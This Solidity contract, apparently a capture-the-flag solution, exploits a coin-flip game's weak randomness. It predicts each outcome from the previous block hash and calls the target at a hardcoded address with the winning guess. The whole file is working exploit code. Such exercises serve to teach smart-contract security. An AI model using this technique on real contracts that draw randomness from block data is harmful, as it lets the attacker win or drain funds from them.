pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol";

contract HackCoinFlip {
  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function flip() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    bool side = blockValue.div(FACTOR) == 1 ? true : false;
    // calling function in target manually
    address(0x71E54a06EbF7D7292B11Dd912EcD28E1c1D29FF9).call(abi.encodeWithSignature("flip(bool)", side));
  }
}
